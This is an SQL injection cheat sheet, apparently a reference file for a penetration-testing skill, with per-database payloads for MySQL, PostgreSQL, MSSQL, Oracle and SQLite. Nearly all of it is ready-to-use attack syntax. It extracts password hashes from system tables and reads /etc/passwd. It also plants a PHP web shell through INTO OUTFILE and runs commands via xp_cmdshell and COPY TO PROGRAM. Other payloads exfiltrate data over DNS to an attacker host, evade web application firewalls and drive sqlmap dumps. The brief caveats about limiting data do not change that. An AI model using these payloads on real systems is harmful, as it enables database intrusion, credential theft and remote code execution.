# SQLi cheat sheet — exact per-DB syntax

Companion to `SKILL.md` (which teaches the method). Open this when you need the precise
byte for a specific database. Prove impact with the least data; never dump customer records.

## Fingerprint the DB (send one, see which errors/returns)
| DB | tell |
|---|---|
| MySQL/MariaDB | `@@version`, `CONNECTION_ID()`, comment `-- -` / `#`, concat needs `CONCAT()` |
| PostgreSQL | `version()`, `::int` cast errors, string concat with `||`, `$$` quoting |
| MSSQL | `@@VERSION`, `WAITFOR DELAY`, error "Conversion failed when converting the varchar value..." |
| Oracle | must select `FROM dual`, `||` concat, no `LIMIT` (uses `ROWNUM`/`FETCH`) |
| SQLite | `sqlite_version()`, `sqlite_master`, no stacked queries via most drivers |

## Comment styles
```
MySQL     -- -   (needs the space)   #   /*comment*/
Postgres  --     /* */
MSSQL     --     /* */
Oracle    --     /* */
SQLite    --     /* */
```

## Version · current user · current db
```
MySQL/Maria   SELECT @@version, current_user(), database()
PostgreSQL    SELECT version(), current_user, current_database()
MSSQL         SELECT @@VERSION, SYSTEM_USER, DB_NAME()
Oracle        SELECT banner FROM v$version; SELECT user FROM dual; SELECT ora_database_name FROM dual
SQLite        SELECT sqlite_version()
```

## UNION-based (after `ORDER BY n` finds the column count)
```
-- match column count & find a string-typed column, then:
MySQL/Maria   ' UNION SELECT NULL,CONCAT(user,0x3a,password),NULL FROM users-- -
PostgreSQL    ' UNION SELECT NULL,string_agg(usename||':'||passwd,','),NULL FROM pg_shadow-- -
MSSQL         ' UNION SELECT NULL,name+':'+master.sys.fn_varbintohexstr(password_hash),NULL FROM sys.sql_logins-- -
Oracle        ' UNION SELECT NULL,username||':'||password,NULL FROM all_users-- -
-- Oracle: every UNION SELECT needs FROM (use FROM dual for constants)
```

## Enumerate schema
```
MySQL/Postgres/MSSQL   SELECT table_name FROM information_schema.tables
                       SELECT column_name FROM information_schema.columns WHERE table_name='users'
Oracle                 SELECT table_name FROM all_tables ; SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SQLite                 SELECT name FROM sqlite_master WHERE type='table' ; then: SELECT sql FROM sqlite_master WHERE name='users'
```

## Boolean-blind (one char at a time)
```
MySQL/Maria   ' AND SUBSTRING((SELECT database()),1,1)='a'-- -
PostgreSQL    ' AND SUBSTR((SELECT current_database()),1,1)='a'-- -
MSSQL         ' AND SUBSTRING((SELECT DB_NAME()),1,1)='a'-- -
Oracle        ' AND SUBSTR((SELECT user FROM dual),1,1)='a'-- -
```

## Time-blind (no visible difference)
```
MySQL/Maria   ' AND SLEEP(5)-- -            OR (conditional) ' AND IF(1=1,SLEEP(5),0)-- -
PostgreSQL    '; SELECT pg_sleep(5)-- -     OR ' AND 1=(SELECT 1 FROM pg_sleep(5))-- -
MSSQL         '; WAITFOR DELAY '0:0:5'-- -
Oracle        ' AND 1=(SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)-- -   (heavy query; DBMS_LOCK.SLEEP often revoked)
SQLite        ' AND 1=randomblob(100000000)-- -   (CPU burn ≈ delay)
```

## Error-based (fast extraction when errors surface)
```
MySQL <5.7    ' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
              ' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
Postgres      ' AND 1=cast((SELECT current_database()) as int)-- -
MSSQL         ' AND 1=convert(int,(SELECT db_name()))-- -
Oracle        ' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))-- -   (or ctxsys.drithsx.sn)
```

## File read / write / command exec (privilege-gated — high impact)
```
MySQL   read : ' UNION SELECT LOAD_FILE('/etc/passwd')-- -        (needs FILE priv, secure_file_priv unset)
        write: ' UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php'-- -
Postgres cmd : COPY (SELECT '') TO PROGRAM 'id';  or large-object read; or CREATE FUNCTION ... (superuser)
        read : CREATE TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT * FROM t;
MSSQL   cmd  : '; EXEC xp_cmdshell 'whoami'-- -    (enable: sp_configure 'xp_cmdshell',1; RECONFIGURE)
Oracle  cmd  : via DBMS_SCHEDULER / java stored proc (DBA-level; version-specific)
```

## OOB exfil (blind, no timing) — when egress allowed
```
MySQL (Win)   ' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.dns.attacker.tld\\a'))-- -
MSSQL         '; DECLARE @q varchar(1024);SET @q='\\'+(SELECT db_name())+'.dns.attacker.tld\a';EXEC master..xp_dirtree @q-- -
Oracle        ' AND (SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.dns.attacker.tld',80) FROM dual) IS NOT NULL-- -
```

## WAF / filter bypass
```
keyword split   UN/**/ION SE/**/LECT        SeLeCt (case)         %55NION (url-encode)
space →         /**/   %09 %0a %0c %0d %a0   ()  e.g. UNION(SELECT(1))
quotes blocked  use hex: 0x61646d696e = 'admin' ; or CHAR(97,100,...)
= blocked       use LIKE / IN / <>  ; comparison via REGEXP
comment blocked terminate with -- - vs #, or balance quotes
sqlmap          --tamper=space2comment,between,charencode  (chain tampers)
```

## sqlmap quick reference (after manual proof)
```
sqlmap -r req.txt --batch                     # -r = saved Burp request (keeps auth/headers/CSRF)
       --dbms=mysql --level=3 --risk=2        # raise only after confirming manually
       --technique=BEUST                       # B=bool E=error U=union S=stacked T=time
       --current-user --current-db --dbs       # enumerate
       -D appdb -T users --dump --where="id<5" # bounded dump — never full customer tables
       --tamper=space2comment,between           # WAF evasion
       --proxy=http://127.0.0.1:8080            # route through Burp to review every request
```
```
```
